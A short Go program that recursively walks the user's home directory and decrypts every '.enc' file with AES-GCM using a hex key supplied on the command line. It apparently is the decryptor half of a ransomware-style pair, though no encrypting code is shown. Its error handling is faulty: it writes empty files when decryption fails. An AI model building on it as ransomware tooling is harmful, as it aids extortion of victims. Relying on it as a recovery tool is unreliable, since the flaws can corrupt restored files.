package main

import (
	"crypto/aes"
	"crypto/cipher"
	"runtime"
	"encoding/hex"
	"fmt"
	"path/filepath"
	"flag"
	"os"
)

var fileSep string
var key []byte

func main() {
	home, _ := os.UserHomeDir()

	var encKey string
	var err error

	flag.StringVar(&encKey, "key", "", "Decrypted hex key")
	flag.Parse()

	opSystem := runtime.GOOS
	fileSep = "/"
	if opSystem == "windows" {
		fileSep = "\\"
	}
	if encKey == "" {
		fmt.Println("Need decryption key")
		os.Exit(1)
	}
	key, err = hex.DecodeString(encKey)
	if err != nil {
		fmt.Println("Error decoding key: ", err)
	}
	traverseFiles(home)
}

func traverseFiles(path string) {
	var dirs []string

	files, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
	}

	for _, file := range files {
		if file.IsDir() {
			base := path + fileSep + file.Name()
			dirs = append(dirs, base)
		} else {
			base := path + fileSep + file.Name()
			decryptFile(base)
		}
	}
	for _, dir := range dirs {
		traverseFiles(dir)
	}
}

func decryptFile(path string) {
	if filepath.Ext(path) != ".enc" {
		return
	}
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
	fi, err := os.Lstat(path)
	if err != nil {
		fmt.Println(err)
	}

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}

	nonce, encData := data[:gcm.NonceSize()], data[gcm.NonceSize():]

	fmt.Println("Decrypting: ", path)
	p := path[:len(path)-4]
	decData, err := gcm.Open(nil, nonce, encData, nil)

	if err != nil {
		fmt.Println("Error: ", err)
		fmt.Println("Path: ", p)
	}

	err = os.WriteFile(p, decData, fi.Mode().Perm())
	if err != nil {
		fmt.Println(err)
	}
}

